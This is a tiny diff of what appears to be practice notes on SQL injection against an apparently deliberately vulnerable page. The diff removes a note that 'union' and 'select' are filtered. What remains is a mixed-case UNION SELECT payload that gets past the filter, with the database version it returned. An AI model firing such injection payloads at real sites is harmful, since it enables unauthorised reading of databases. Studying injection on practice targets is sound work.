@@ -1,8 +1,4 @@
 http://root0x00.altervista.org/sqli/simple.php
 
-* Filtered
-  union / UNION
-  select / SELECT
-
 ?id=0' UnioN Select 1,2,3,4,version() %23
 >> 5.6.33-log
